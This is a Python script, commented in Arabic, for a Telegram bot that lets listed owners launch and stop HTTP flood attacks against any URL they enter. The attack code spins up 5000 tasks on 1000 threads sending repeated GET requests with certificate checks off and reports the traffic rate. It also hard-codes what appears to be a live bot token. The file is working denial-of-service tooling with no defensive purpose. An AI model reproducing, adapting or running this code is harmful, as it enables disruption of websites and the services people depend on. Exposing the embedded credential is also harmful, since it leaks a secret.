import requests
import threading
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging

# إعداد السجلات مع مستوى تصحيح أكثر تفصيلاً
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake_ip = '182.21.20.32'

# إعداد الرؤوس القياسية لجلسة requests
headers = {
    'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')
}

# إنشاء جلسة واحدة للاستخدام المتكرر
session = requests.Session()
session.verify = False
session.headers.update(headers)

# متغيرات للتحكم في الهجوم
bytes_transferred = 0
lock = threading.Lock()
stop_attack_event = threading.Event()

# قراءة ربما قائمة معينة من المستخدمين
Owner = []
NormalUsers = []

def read_users():
    try:
        with open('owners.txt', 'r') as file:
            Owner.extend(file.read().splitlines())
    except FileNotFoundError:
        logging.warning("لم يتم العثور على ملفات القوائم. سيتم استخدام القوائم الفارغة.")

    try:
        with open('normal_users.txt', 'r') as file:
            NormalUsers.extend(file.read().splitlines())
    except FileNotFoundError:
        logging.warning("لم يتم العثور على ملفات القوائم. سيتم استخدام القوائم الفارغة.")

read_users()

def attack(url):
    """تنفيذ الهجوم عبر إرسال طلبات متتابعة"""
    global bytes_transferred
    while not stop_attack_event.is_set():
        try:
            response = session.get(url)
            with lock:
                bytes_transferred += len(response.content)
            logging.debug(f"تم إرسال الطلب إلى: {url}")
        except requests.RequestException as e:
            logging.error(f"حدث خطأ: {e}")

def start_attack(url):
    """بدء الهجوم عبر عدة خيوط"""
    stop_attack_event.clear()
    with ThreadPoolExecutor(max_workers=1000) as executor:
        tasks = [executor.submit(attack, url) for _ in range(5000)]

    for task in tasks:
        try:
            task.result()
        except Exception as e:
            logging.error(f"خطأ في تنفيذ الخيط: {e}")

def stop_attack():
    """إيقاف الهجوم"""
    stop_attack_event.set()
    logging.info("تم إيقاف الهجوم.")

def calculate_speed():
    """حساب سرعة النقل ومراقبة الأداء"""
    global bytes_transferred
    while not stop_attack_event.is_set():
        time.sleep(1)
        with lock:
            speed = bytes_transferred / (1024 * 1024)
            bytes_transferred = 0
        logging.info(f"سرعة النقل: {speed:.2f} MB/s")

# يجب تعيين التوكن بشكل مباشر
TOKEN = '7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4'  # هنا يجب أن تضع توكن البوت الخاص بك
if not TOKEN:
    logging.error("Bot token is not defined")
    raise Exception('Bot token is not defined')

bot = telebot.TeleBot(TOKEN)

def is_owner(user_id):
    """التحقق من صحة المالك"""
    return str(user_id) in Owner

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """التعامل مع رسالة البدء من المستخدم"""
    if is_owner(message.from_user.id):
        bot.reply_to(message, "مرحبًا بك في بوت ديابلو! استخدم القائمة أدناه لاختيار الأوامر.")
    else:
        bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")

    if is_owner(message.from_user.id):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("إضافة مستخدم", callback_data="add_user"))
        markup.add(InlineKeyboardButton("إزالة مستخدم", callback_data="remove_user"))
        markup.add(InlineKeyboardButton("بدء هجوم", callback_data="start_attack"))
        markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
        bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: is_owner(call.message.chat.id))
def callback_query(call):
    """التعامل مع الردود التفاعلية"""
    if call.data == "add_user":
        msg = bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإضافته:")
        bot.register_next_step_handler(msg, process_add_user)
    elif call.data == "remove_user":
        msg = bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإزالته:")
        bot.register_next_step_handler(msg, process_remove_user)
    elif call.data == "start_attack":
        msg = bot.send_message(call.message.chat.id, "أدخل رابط الهدف لبدء الهجوم:")
        bot.register_next_step_handler(msg, process_start_attack)
    elif call.data == "stop_attack":
        stop_attack()
        bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")

def process_add_user(message):
    """إضافة مستخدم إلى القائمة"""
    user_id = message.text
    if user_id:
        with open('normal_users.txt', 'a') as file:
            file.write(user_id + '\n')
        NormalUsers.append(user_id)
        bot.reply_to(message, "تمت إضافة المستخدم بنجاح.")
        logging.info("تمت إضافة المستخدم بنجاح.")
    else:
        bot.reply_to(message, "لم يتم إدخال معرف المستخدم بشكل صحيح.")
        logging.warning("فشل في إدخال معرف المستخدم بشكل صحيح.")

def process_remove_user(message):
    """إزالة مستخدم من القائمة"""
    user_id = message.text
    if user_id in NormalUsers:
        with open('normal_users.txt', 'w') as file:
            for user in NormalUsers:
                if user != user_id:
                    file.write(user + '\n')
        NormalUsers.remove(user_id)
        bot.reply_to(message, "تمت إزالة المستخدم بنجاح.")
        logging.info("تمت إزالة المستخدم بنجاح.")
    else:
        bot.reply_to(message, "لم يتم إدخال معرف المستخدم بشكل صحيح.")
        logging.warning("فشل في إدخال معرف المستخدم بشكل صحيح.")

def process_start_attack(message):
    """بدء هجوم على الهدف المحدد"""
    url = message.text
    if url:
        bot.reply_to(message, f"بدء الهجوم على: {url}")
        speed_thread = threading.Thread(target=calculate_speed, daemon=True)
        speed_thread.start()
        attack_thread = threading.Thread(target=start_attack, args=(url,))
        attack_thread.start()
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
        bot.send_message(message.chat.id, "الهجوم جاري. اضغط على الزر أدناه لإيقاف الهجوم:", reply_markup=markup)
    else:
        bot.reply_to(message, "لم يتم إدخال رابط الهدف بشكل صحيح.")
        logging.warning("فشل في إدخال رابط الهدف بشكل صحيح.")

def main():
    """تشغيل البوت"""
    bot.polling()

if __name__ == '__main__':
    main()
